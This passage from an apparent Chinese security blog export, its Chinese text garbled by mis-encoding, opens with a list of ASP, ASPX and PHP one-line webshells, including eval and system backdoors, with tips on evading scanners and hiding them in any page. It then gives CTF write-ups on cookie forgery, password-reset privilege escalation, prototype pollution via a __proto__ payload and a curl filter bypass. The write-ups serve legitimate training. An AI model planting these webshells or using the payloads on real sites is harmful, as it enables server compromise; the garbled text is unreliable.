Response.Write \"æ“ä½œç³»ç»Ÿä¸º:\"&amp;Request.ServerVariables(\"OS\") Response.Write \"&lt;br&gt;\" Response.Write \"WEBæœåŠ¡å™¨ç‰ˆæœ¬ä¸º:\"&amp;Request.ServerVariables(\"SERVER_SOFTWARE\") Response.Write \"&lt;br&gt;\" Response.Write \"&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;\" Response.Write \"&lt;br&gt;\" Response.Write \"&lt;input type=submit value=save&gt;\" Response.Write \"&lt;/form&gt;\" &lt;/Script&gt; ASPä¸€å¥è¯:&lt;%IfRequest(â€œ1â€³)&lt;&gt;â€\"ThenExecuteGlobal(Request(â€œ1â€³))%&gt; PHPé˜²æ€æ”¾æ‰« ä¸€å¥è¯ï¼š&lt;?php (])?&gt; ä¸Šé¢è¿™å¥æ˜¯é˜²æ€é˜²æ‰«çš„ï¼ç½‘ä¸Šå¾ˆå°‘äººç”¨ï¼å¯ä»¥æ’åœ¨ç½‘é¡µä»»ä½•ASPæ–‡ä»¶çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼Œæ¯”å¦‚ index.aspé‡Œé¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ å› ä¸ºåŠ äº†åˆ¤æ–­ï¼åŠ äº†åˆ¤æ–­çš„PHPä¸€å¥è¯ï¼Œä¸ä¸Šé¢çš„ASPä¸€å¥è¯ç›¸åŒé“ç†ï¼Œä¹Ÿæ˜¯å¯ä»¥æ’åœ¨ä»»ä½•PHPæ–‡ä»¶ çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼&lt;?if(isset($_POST['1'])){eval($_POST['1']);}?&gt;&lt;?php system($_REQUEST[1]);?&gt; æ— é˜²ä¸‹è½½è¡¨ï¼Œæœ‰é˜²ä¸‹è½½è¡¨å¯å°è¯•æ’å…¥ä»¥ä¸‹è¯­å¥çªç ´çš„ä¸€å¥è¯ &lt;%execute request(â€œclassâ€)%&gt;&lt;%'&lt;% loop &lt;%:%&gt;&lt;%'&lt;% loop &lt;%:%&gt;&lt;%execute request(â€œclassâ€)%&gt;&lt;%execute request(â€œclassâ€)'&lt;% loop &lt;%:%&gt; å¤‡ä»½ä¸“ç”¨&lt;%eval(request(â€œ1â€³)):response.end%&gt; aspä¸€å¥è¯&lt;%execute(request(â€œ1â€³))%&gt; aspxä¸€å¥è¯:&lt;scriptrunat=â€serverâ€&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y(â€œadd6bb58e139be10â€³);&lt;/script&gt; å¯ä»¥èº²è¿‡é›·å®¢å›¾çš„ä¸€å¥è¯ã€‚ &lt;%set ms = server.CreateObject(â€œMSScriptControl.ScriptControl.1â€³) ms.Language=â€VBScriptâ€ms.AddObjectâ€Responseâ€,Responsems.AddObjectâ€requestâ€, requestms.ExecuteStatement(â€œevâ€&amp;â€al(request(â€œâ€1â€³â€))â€)%&gt; ä¸ç”¨'&lt;,&gt;â€˜çš„aspä¸€å¥è¯&lt;scriptrunat=server&gt;execute request(â€œ1â€³)&lt;/script&gt; ä¸ç”¨åŒå¼•å·çš„ä¸€å¥è¯ã€‚&lt;%eval request(chr(35))%&gt;","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"æ”»é˜²ä¸–ç•Œ-bug","path":"/2023/08/23/bug/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¢˜ç›®ä¾æ—§æ˜¯ç™»å½•é¡µé¢ï¼Œå…ˆæµ‹è¯•å¼±å£ä»¤ï¼Œæ²¡ååº”ï¼Œéšåæ‰«ç›®å½•çš„åŒæ—¶çœ‹çœ‹æ˜¯å¦ä¸ºsqlï¼Œä½†å¾ˆæ˜æ˜¾ä¹Ÿä¸æ˜¯ï¼Œäºæ˜¯éšä¾¿æ³¨å†Œäº†ä¸€ä¸ªç”¨æˆ·ï¼Œç”¨æ¥æŠ“åŒ…çœ‹çœ‹æ˜¯å¦å­˜åœ¨é€»è¾‘æ¼æ´ cookieè§£å¯†æ›´æ”¹ è¿™é‡Œä¸€çœ‹uidä¹‹ç±»çš„ï¼Œå°±æ„Ÿè§‰æ˜¯é€»è¾‘æ¼æ´äº†ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯å€Ÿé‰´äº†wpï¼Œéšåä»–è¯´è¿™ä¸ªcookieä¸­çš„useråƒæ˜¯md5åŠ å¯†ï¼Œäºæ˜¯ä¹æˆ‘è§£å¯†ä¸€ç•ªçœ‹çœ‹ è¯•äº†å¾ˆå¤šç½‘ç«™éƒ½è§£å¯†ä¸æˆåŠŸï¼Œçœ‹æ¥åªèƒ½é çŒœï¼Œè¿™é‡Œå¹¸è¿çš„è¯çŒœåˆ°æ˜¯æœ‰\"UID:ç”¨æˆ·å\"åŠ å¯†è€Œæˆ å¹¸è¿çš„è¯åœ¨è¿™é‡Œå¯¹\"1:admin\"è¿›è¡ŒåŠ å¯†ä¿®æ”¹cookieå°±å¯ä»¥ç›´æ¥çœ‹åˆ°adminç”¨æˆ·çš„ä¿¡æ¯ï¼Œéšåå°±å¯ä»¥é‡ç½®å¯†ç ï¼Œä¸è¿‡è¿™æ¡è·¯ä¸å¤ªå¥½èµ°ï¼Œæ¢ä¸€æ¡ç®€å•çš„ é‡ç½®å¯†ç çš„è¶Šæƒ æˆ‘ä»¬å°†æˆ‘ä»¬æ³¨å†Œè¿‡çš„ç”¨æˆ·è¾“å…¥è¿›å»è¿›è¡Œå¯†ç é‡ç½®çœ‹èƒ½å¦å®ç°è¶Šæƒï¼Œåœ¨è¿™é‡Œå°è¯•çš„åŸå› åœ¨äºï¼Œåˆ«å¤„çš„åŠŸèƒ½ç‚¹å‡ä¸å­˜åœ¨è¶Šæƒæ¼æ´ã€‚ ä¿®æ”¹å¯†ç åbpæŠ“åŒ… åœ¨è¿™é‡Œä¿®æ”¹ä¸ºadminï¼Œadminçœ‹çœ‹ å‘ç°æˆåŠŸäº†ï¼Œé‚£æˆ‘ä»¬ç™»å½•ä¸€ä¸‹çœ‹çœ‹ ç™»å½•è¿›å»åï¼Œå‘ç°ç‚¹å‡»manageæ˜¾ç¤ºipé”™è¯¯ï¼Œæ— æƒè®¿é—®ï¼Œé‚£ä¼°è®¡å°±æ˜¯ä¿®æ”¹xffæˆ–è€…ssrfäº†ï¼Œé‚£æˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹ å‘ç°æœ‰æ•ˆæœï¼Œçœ‹ä¸€ä¸‹æºç  å‘ç°moduleçš„å€¼ä¸ºæ–‡ä»¶ç®¡ç†ï¼Œå¦‚æœæ˜¯ä½¬çš„è¯å‡­ç›´è§‰è®¤ä¸ºæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œæ‰€ä»¥ä»–ä»¬ä¼šå°†doèµ‹å€¼ä¸ºuploadï¼Œæœç„¶è¿˜çœŸæˆåŠŸäº† wpæ˜¯è¿™æ ·è¯´çš„ï¼š æˆåŠŸç»•è¿‡IPæ£€æµ‹åï¼Œèƒ½çœ‹è§ä¾§ç€çš„ç¬‘è„¸å’ŒWhere Is The Flag?çš„å­—æ ·ã€‚åœ¨æºç ä¸­éšè—äº†å¦ä¸€ä¸ªä¿¡æ¯index.php?module=filemanage&amp;do=???.æ–‡ä»¶ç±»å‹çš„actioné€šå¸¸éƒ½æ˜¯uploadï¼Œæ•…è®¿é—®index.php?module=filemanage&amp;do=uploadé¡µé¢ï¼Œåœ¨æ–°é¡µé¢ä¸­èƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚ éšä¾¿ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶æµ‹è¯• å‘ç°æœ‰è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬å…ˆæ›´æ”¹åç¼€çœ‹çœ‹ï¼Œè¿™é‡Œç”¨00æˆªæ–­çœ‹çœ‹ å‘ç°æˆåŠŸï¼Œç„¶ååˆè¯´æˆ‘ä»¬çš„æ–‡ä»¶ç±»å‹ä¸å¯¹ï¼Œäºæ˜¯æˆ‘æ”¹ä¸ºä¸Šè¿°å›¾ç‰‡çš„ï¼Œå‘ç°ä¾æ—§ä¸è¡Œï¼Œé‚£å¯èƒ½å°±æ˜¯æ–‡ä»¶å†…å®¹ä¹Ÿæœ‰è¿‡æ»¤ï¼Œè¿™é‡Œå°±çœ‹äº†wpçš„ å°†æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¸º&lt;script language='php'&gt;&lt;/script&gt;ï¼Œç»•è¿‡&lt;?çš„é™åˆ¶ ä»¥ä¸ºæˆåŠŸäº†ï¼Œç»“æœéå¾—å°†æ–‡ä»¶ç±»å‹ä¿®æ”¹ä¸ºpngæ‰å¯ä»¥ æ€ä¹ˆè¯´ï¼Œåšäº†ä¸€æ¬¡ä¸‹æ¥ï¼Œæœ‰ç‚¹å®æˆ˜çš„å‘³é“ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ ä¸€å¥è¯æœ¨é©¬å¤§å…¨","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-wife_wife","path":"/2023/08/23/wife-wife/","content":"é¢˜ç›®æè¿°ï¼š cat-wifi æœ¬é¢˜ä¸éœ€è¦çˆ†ç ´ é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå…ˆæµ‹è¯•å¼±å£ä»¤ï¼Œæ²¡ç”¨ï¼Œäºæ˜¯æ‰«ç½‘ç«™çš„åŒæ—¶ï¼Œçœ‹çœ‹ä¼šä¸ä¼šæ˜¯sqlï¼Œæµ‹è¯•ä¸€ç•ªå•¥ä¹Ÿæ²¡æœ‰ï¼Œæºä»£ç ä¹Ÿæ²¡ä¿¡æ¯ï¼Œé‚£å°±çœ‹çœ‹æ³¨å†Œé¡µé¢ è¿™é‡Œä¹Ÿæ²¡å•¥åˆ©ç”¨çš„ï¼Œå°±æ˜¯æœ‰ä¸ªis adminçš„æŒ‰é’®ï¼Œè¾“å…¥æœ‰æ•ˆé‚€è¯·ç æ‰èƒ½è¿›å…¥ï¼Œè¿™æ€è·¯å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä»¥ç®¡ç†å‘˜çš„èº«ä»½ç™»å½•è¿›å»è‚¯å®šå°±èƒ½å¾—åˆ°flagã€‚å”‰ï¼Œæˆ‘ä¹Ÿå°±åˆ†æåˆ°è¿™å„¿äº†ï¼ŒåŒæ—¶æŠ“åŒ…çœ‹äº†çœ‹ å‘ç°æ˜¯ä¸ªjsonæ•°æ®æ ¼å¼ï¼Œä½†æ²¡å•¥æ€è·¯æ— ä»ä¸‹æ‰‹ï¼Œè¿˜æ˜¯é wpåº¦æ—¥å§ã€‚ã€‚ã€‚ çœ‹äº†wpå‘ç°æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚ã€‚ã€‚è™½ç„¶è¯´åšè¿‡ç±»ä¼¼çš„é¢˜ï¼Œä½†å¹¶ä¸æ“…é•¿ åŸå‹é“¾æ±¡æŸ“ åŸå‹é“¾æ±¡æŸ“å‚è€ƒ é€ æˆè¿™ä¸ªæ¼æ´çš„æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„å‰æï¼Œè¿™é¢˜ç›®çš„åç«¯æ˜¯node.jsæ¥å†™çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åç«¯ä¸æ˜¯phpæœåŠ¡å™¨ï¼Œä¸æ˜¯javaæœåŠ¡å™¨ï¼Œè€Œæ˜¯JavaScriptæœåŠ¡å™¨ å› ä¸ºæ˜¯JavaScriptè¯­è¨€æ¥å¤„ç†åç«¯+ç”¨JavaScriptçš„é‚£ä¸ªå‡½æ•°æ¥å¤„ç†ï¼Œæ‰€ä»¥æ‰æœ‰è¿™ä¸ªæ¼æ´äº§ç”Ÿ å¦‚ä¸‹ä»£ç ï¼Œprototypeæ˜¯newClassç±»çš„ä¸€ä¸ªå±æ€§ã€‚newClass å®ä¾‹åŒ–çš„å¯¹è±¡ newObj çš„ .proto æŒ‡å‘ newClass ç±»çš„ prototype function newClass() {this.test = 1;}var newObj = new newClass(); JSON è§£æçš„æƒ…å†µä¸‹ï¼Œproto ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ã€‚å¦‚æœæ˜¯let o2 = {a: 1, â€œprotoâ€: {b: 2}}åˆ™__proto__ä¼šè¢«è®¤ä¸ºæ˜¯o2çš„åŸå‹ã€‚å¦‚æœä½œä¸ºé”®åï¼ˆä¸ä¼šè¢«è§£æï¼‰å°±ä¼šä½œä¸ºå­ç±»çš„åŸå‹ let o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b)o3 = {} console.log(o3.b) mergeç”¨äºåˆå¹¶å¯¹è±¡ merge æ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚ çœ‹ä¸€ä¸‹å®ä¾‹ï¼š baseUser = { a:1 } user = { a:2, b:1, __proto__:{ c:3 } } // è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ï¼šæµ…å¤åˆ¶ä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä½æ˜¯å¯¹è±¡çš„å†…å®¹ï¼Œåé¢çš„å‚æ•°ä½æ˜¯å¤šä¸ªå¯¹è±¡å†…å®¹å åŠ è¿›å»ï¼Œè¿›è¡Œå¤åˆ¶å‡ºä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ let newUser = Object.assign({}, baseUser, user) // æ— æ±¡æŸ“ï¼Œç»“æœæ­£å¸¸ console.log(newUser) // {a: 2, b: 1} // æ— æ±¡æŸ“ï¼Œç»“æœæ­£å¸¸ console.log(newUser.__proto__) // {constructor: Æ’, __defineGetter__: Æ’, __defineSetter__: Æ’, hasOwnProperty: Æ’, __lookupGetter__: Æ’, â€¦} å¯é—®é¢˜æ˜¯ï¼Œåç«¯æœåŠ¡å™¨æ˜¯JavaScriptï¼Œæˆ‘ä»¬é€šè¿‡postå‘é€è¿‡å»çš„ jsonæ˜¯å­—ç¬¦ä¸²ï¼ŒJavaScriptéœ€è¦é€šè¿‡JSON.parse()å‡½æ•°æ‰èƒ½æŠŠ jsonå­—ç¬¦ä¸²è½¬æˆå¯¹è±¡ baseUser = { a:1 } // è¿™æ¬¡ä½¿ç”¨å‡½æ•°æŠŠjsonå­—ç¬¦ä¸²è½¬æˆå¯¹è±¡ï¼Œå°±å‡ºé—®é¢˜äº†ï¼Œ user = JSON.parse(' {\"a\" : 2 , \"b\" : 3 , \"__proto__\" : { \"c\" : 4 }} ') // è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ï¼šæµ…å¤åˆ¶ä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä½æ˜¯å¯¹è±¡çš„å†…å®¹ï¼Œåé¢çš„å‚æ•°ä½æ˜¯å¤šä¸ªå¯¹è±¡å†…å®¹å åŠ è¿›å»ï¼Œè¿›è¡Œå¤åˆ¶å‡ºä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ let newUser = Object.assign({}, baseUser, user) console.log(newUser) // {a: 2, b: 1} ï¼Œ__proto__æ˜¯éšè—å±æ€§ï¼Œæ˜¯ä¸ä¼šç›´æ¥æ˜¾ç¤ºçš„ console.log(newUser.__proto__) // {c: 4} ï¼Œä½†æ˜¯ä¸€æ‰“å°å°±å‡ºæ¥äº† console.log(newUser.c) // 4 ï¼Œå·²ç»è¢«æ±¡æŸ“äº†ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸€ç›´å­˜åœ¨çš„ é¢˜ç›®æºç  è·Ÿç€wpå­¦å­¦æºç  // postè¯·æ±‚çš„è·¯å¾„ app.post('/register', (req, res) =&gt; { let user = JSON.parse(req.body) // æŠŠæˆ‘ä»¬è¾“å…¥çš„è´¦å·å¯†ç ï¼Œä»jsonå­—ç¬¦ä¸²è½¬æˆå¯¹è±¡ // åˆ¤æ–­æˆ‘ä»¬æœ‰æ²¡æœ‰è¾“å…¥è´¦å·å’Œå¯†ç  if (!user.username || !user.password) { return res.json({ msg: 'empty username or password', err: true }) } // åˆ¤æ–­è´¦å·æ˜¯å¦å­˜åœ¨æ€»å¯¹è±¡çš„usernameé‡Œï¼Œå¦‚æœç›¸åŒçš„usernameå°±æ˜¯é‡å¤ç”¨æˆ·åäº† if (users.filter(u =&gt; u.username == user.username).length) { return res.json({ msg: 'username already exists', err: true }) } // isAdminæ˜¯å¦true ä¸ é‚€è¯·ç æ˜¯ä¸æ˜¯ç­‰äºè¿™ä¸ªå¸¸é‡ï¼Œæ‰€ä»¥sqlæ³¨å…¥æ²¡ç”¨ï¼Œé‚€è¯·ç æ˜¯ä¸ªå¸¸é‡ if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) { user.isAdmin = false return res.json({ msg: 'invalid invite code', err: true }) } // ä½¿ç”¨ç³»ç»Ÿå‡½æ•°å¤åˆ¶å¯¹è±¡ï¼Œæ‰“åŒ…æˆä¸€ä¸ªæ–°çš„å¯¹è±¡ let newUser = Object.assign({}, baseUser, user) users.push(newUser) // å­˜åˆ°æ€»å¯¹è±¡é‡Œ res.json({ msg: 'user created successfully', err: false }) // è®¾ç½®è¿”å›ä¿¡æ¯ }) çœ‹äº†è¿™éƒ¨åˆ†æºç èƒ½åˆ¤æ–­å‡ºï¼Œå¦‚æœè¿™ä¸ªç™»é™†çš„å¯¹è±¡é‡Œï¼ŒisAdminçš„å±æ€§æ˜¯trueï¼Œé‚£å°±è¯æ˜æ˜¯ä¸€ä¸ªç®¡ç†å‘˜ï¼Œå¦‚æœæ˜¯æ™®é€šæ³¨å†Œçš„ç”¨æˆ·ï¼ŒisAdminå±æ€§æ˜¯falseï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¿®æ”¹useråŸå‹çš„å±æ€§çš„å€¼ï¼Œé‚£ä¹ˆè¯¥ç±»çš„å±æ€§çš„å€¼ä¹Ÿå°±éšç€å˜äº†ï¼Œpayloadå¦‚ä¸‹ {\"username\":\"bcx\",\"password\":\"123\",\"__proto__\":{\"isAdmin\":true}} æˆåŠŸæ‹¿åˆ°flag ä¸è¿‡çœ‹äº†å¾ˆå¤šæ–‡ç« ä¹Ÿæ²¡äººè¯´æ˜æ˜¯å¦‚ä½•å‘ç°åŸå‹é“¾çš„ï¼Œçœ‹æ¥åº”è¯¥æ˜¯ä½¬ä»¬åšé¢˜å¤šäº†çš„ç›´è§‰å§ã€‚ã€‚ã€‚ï¼Œä¸è¿‡å€’æ˜¯å¯ä»¥é å¦‚ä¸‹çš„æ’ä»¶çœ‹åˆ°è¿™é‡Œç”¨çš„æ˜¯node.jsè¯­è¨€ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ•°æ®åº“ã€‚ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-ez_curl","path":"/2023/08/23/ez-curl/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š &lt;?php highlight_file(__FILE__); $url = 'http://back-end:3000/flag?'; $input = file_get_contents('php://input'); $headers = (array)json_decode($input)-&gt;headers; //å–å‡ºåä¸º headers çš„å±æ€§å€¼ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•°ç»„ for($i = 0; $i &lt; count($headers); $i++){ $offset = stripos($headers[$i], ':'); //ç¡®å®šå†’å·é¦–æ¬¡å‡ºç°çš„ä½ç½® $key = substr($headers[$i], 0, $offset); //å–å‡ºå†’å·ä¹‹å‰çš„å†…å®¹ $value = substr($headers[$i], $offset + 1);//å–å‡ºå†’å·ä¹‹åçš„å†…å®¹ if(stripos($key, 'admin') &gt; -1 &amp;&amp; stripos($value, 'true') &gt; -1){ die('try hard'); } } $params = (array)json_decode($input)-&gt;params; //åŒä¸Š ///ä½¿ç”¨ http_build_query() å‡½æ•°å°†è§£æå‡ºçš„ params æ•°ç»„è½¬æ¢ä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¿½åŠ åˆ° $url åé¢ã€‚ $url .= http_build_query($params); $url .= '&amp;admin=false'; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);//æ­¤å¤„ä¸ºåˆ›å»ºå¹¶åˆå§‹åŒ–curlå¯¹è¯ï¼Œé…ç½®ç›¸å…³é€‰é¡¹ curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000); curl_setopt($ch, CURLOPT_NOBODY, FALSE); $result = curl_exec($ch);//æ‰§è¡Œcurlè¯·æ±‚ï¼Œå¹¶å°†è¿”å›çš„ç»“æœä¿å­˜åœ¨å˜é‡ä¸­ curl_close($ch);//å…³é—­å¯¹è¯ echo $result; try hard1 è¿™é‡Œå…ˆçœ‹ä¸€ä¸‹é¢˜ç›®ç»™çš„é™„ä»¶ app.js const express = require('express');//å¯¼å…¥äº† express æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªNode.js web æ¡†æ¶ const app = express();//åˆ›å»º Express åº”ç”¨å®ä¾‹ const port = 3000;//å®šä¹‰ç«¯å£å’Œ flag const flag = process.env.flag;//å–å‡ºç¯å¢ƒå˜é‡ä¸­çš„flag //ä½¿ç”¨ app.get() æ–¹æ³•å®šä¹‰äº†ä¸€ä¸ªè·¯ç”±ï¼Œè¯¥è·¯ç”±ç›‘å¬è·¯å¾„ /flag çš„ GET è¯·æ±‚ï¼Œå½“æ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚æ—¶ï¼Œä¼šè§¦å‘å›è°ƒå‡½æ•°ã€‚ app.get('/flag', (req, res) =&gt; { //å¦‚æœqueryå±æ€§çš„adminå‚æ•°å…¶å€¼ä¸å«falseï¼Œä¸”è¯·æ±‚å¤´ä¸­çš„adminå­—æ®µçš„å€¼ä¸ºtrueåˆ™è¾“å…¥flag if(!req.query.admin.includes('false') &amp;&amp; req.headers.admin.includes('true')){ res.send(flag); }else{ res.send('try hard'); } }); app.listen({ port: port , host: '0.0.0.0'});//ä½¿ç”¨ app.listen() æ–¹æ³•å¯åŠ¨æœåŠ¡å™¨ï¼Œç›‘å¬æŒ‡å®šçš„ç«¯å£å’Œä¸»æœº å®¡å®Œä¹Ÿæ²¡å•¥æ€è·¯ï¼Œæ‰«ç›®å½•ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œæ€è€ƒäº†ä¸€ä¼šå„¿ï¼Œåªæ˜¯æ„Ÿè§‰åº”è¯¥æ˜¯æŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹æŸäº›ä¿¡æ¯ï¼Œä»¤ç›‘å¬çš„æœåŠ¡å™¨è¿”å›flagï¼Œæ‰€ä»¥å€Ÿé‰´wpå§ å…ˆçœ‹ä¸€ä¸‹phpä»£ç ï¼Œæœ‰ä¸€ä¸ªfile_get_contents(â€˜php://inputâ€™)ï¼Œè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå½“Content-Typeä¸ºapplication/x-www-form-urlencodedä¸”æäº¤æ–¹æ³•æ˜¯POSTæ–¹æ³•æ—¶ï¼Œ$_POSTæ•°æ®ä¸php://inputæ•°æ®æ˜¯ä¸€è‡´çš„ã€‚ ç„¶åä¼š$headers = (array)json_decode($input)-&gt;headersæŠŠpostè¿‡å»çš„æ•°æ®è§£ç æˆæ•°ç»„ï¼Œå¾ˆæ˜æ˜¾postçš„å†…å®¹å°±æ˜¯httpè¯·æ±‚é‡Œçš„headersï¼Œå†™postæ•°æ®çš„æ—¶å€™è¦å†™æˆjsonçš„å½¢å¼ã€‚åƒè¿™æ ·ï¼š {\"headers\": [\"admin:true\"]} expressæ¡†æ¶ Expressæ˜¯ä¸€ä¸ªæµè¡Œçš„Node.js Webæ¡†æ¶ï¼Œå®ƒæä¾›äº†è®¸å¤šæœ‰ç”¨çš„åŠŸèƒ½æ¥æ„å»ºWebåº”ç”¨ç¨‹åºã€‚å…¶ä¸­ä¹‹ä¸€æ˜¯å‚æ•°è§£æï¼Œå®ƒå…è®¸å¼€å‘è€…è§£æHTTPè¯·æ±‚ä¸­çš„å‚æ•°ã€‚Expressæä¾›äº†è®¸å¤šé€‰é¡¹æ¥é…ç½®å‚æ•°è§£æã€‚å…¶ä¸­ä¹‹ä¸€æ˜¯parameterLimité€‰é¡¹ã€‚ parameterLimité€‰é¡¹ç”¨äºæŒ‡å®šquery stringæˆ–è€…request payloadçš„æœ€å¤§æ•°é‡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒçš„å€¼æ˜¯1000ã€‚å¦‚æœä½ çš„åº”ç”¨ç¨‹åºéœ€è¦è§£æå¤§é‡çš„æŸ¥è¯¢å­—ç¬¦ä¸²æˆ–è€…è¯·æ±‚è´Ÿè½½ï¼Œä½ å¯èƒ½éœ€è¦å¢åŠ è¿™ä¸ªé™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ çš„åº”ç”¨ç¨‹åºéœ€è¦å¤„ç†éå¸¸é•¿çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œä½ å¯ä»¥å°†parameterLimitè®¾ç½®ä¸ºä¸€ä¸ªæ›´é«˜çš„å€¼ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨parameterLimité€‰é¡¹æ¥å¢åŠ query stringå’Œrequest payloadçš„é™åˆ¶ï¼š const express = require('express') const app = express() // å°†parameterLimitè®¾ç½®ä¸º10000 app.use(express.json({ parameterLimit: 10000 })) app.use(express.urlencoded({ parameterLimit: 10000, extended: true })) åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å°†parameterLimitè®¾ç½®ä¸º10000ã€‚è¿™å°†å…è®¸æˆ‘ä»¬è§£ææ›´å¤§çš„è¯·æ±‚è´Ÿè½½å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ å°†parameterLimitè®¾ç½®ä¸ºä¸€ä¸ªéå¸¸é«˜çš„å€¼ï¼Œå¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚æ”»å‡»è€…å¯ä»¥å‘é€æ¶æ„è¯·æ±‚ï¼ŒåŒ…å«å¤§é‡å‚æ•°ï¼Œå¯¼è‡´æœåŠ¡å™¨å´©æºƒã€‚å› æ­¤ï¼Œä½ åº”è¯¥è°¨æ…åœ°è®¾ç½®å‚æ•°é™åˆ¶ï¼Œå¹¶ç¡®ä¿ä½ çš„åº”ç”¨ç¨‹åºå…·æœ‰æœ‰æ•ˆçš„å®‰å…¨æªæ–½ï¼Œä»¥é˜²æ­¢æ­¤ç±»æ”»å‡»ã€‚ æœ¬ä½“ä¸¤ä¸ªçŸ¥è¯†ç‚¹åˆ†åˆ«æ˜¯ï¼š 1.expressçš„parameterLimité»˜è®¤ä¸º1000 2.æ ¹æ®rfcï¼Œheaderå­—æ®µå¯ä»¥é€šè¿‡åœ¨æ¯ä¸€è¡Œå‰é¢è‡³å°‘åŠ ä¸€ä¸ªSPæˆ–HTæ¥æ‰©å±•åˆ°å¤šè¡Œ ç¬¬ä¸€ç‚¹ï¼šæ¥è‡ªæºä»£ç çš„è¿™ä¸€è¡Œã€‚ç»“åˆè¿™ç¯‡æ–‡ç« çš„åˆ†æï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¶…è¿‡1000ä¸ªæ—¶ï¼Œä¹‹åçš„å‚æ•°ä¼šè¢«èˆå¼ƒæ‰ã€‚äºæ˜¯è¿™é‡Œæˆ‘ä»¬æœ€å¼€å§‹å‘ä¸ª\"admin\":\"t\"è®¾ç½®å¥½adminçš„å€¼ï¼ŒåŠ ä¸Š999ä¸ªæ²¡ç”¨çš„å‚æ•°ï¼ŒæŠŠç¨‹åºæ‹¼æ¥çš„&amp;admin=falseæŒ¤æ‰ï¼Œå³å¯ç»•è¿‡è¿‡æ»¤ã€‚ ç¬¬äºŒç‚¹ï¼šheader å­—æ®µå¯ä»¥é€šè¿‡åœ¨æ¯ä¸€è¡Œå‰é¢è‡³å°‘åŠ ä¸€ä¸ªSP æˆ– HT æ¥æ‰©å±•åˆ°å¤šè¡Œã€‚ä»¥æ­¤ç»•è¿‡å¯¹ headers çš„è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯ï¼š â€‹ è¦æ±‚headersé‡Œçš„adminå­—æ®µåŒ…å«â€™trueâ€™å°±è¡Œäº†ï¼Œå¯ä»¥æ˜¯â€™xtrueâ€™ï¼Œè¿™é‡Œæ ¹æ®RFC 7230(HTTP/1.1åè®®çš„å®šä¹‰)çš„è§„å®šï¼Œè§„å®šäº† field-name æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ‰“å°çš„ ASCII 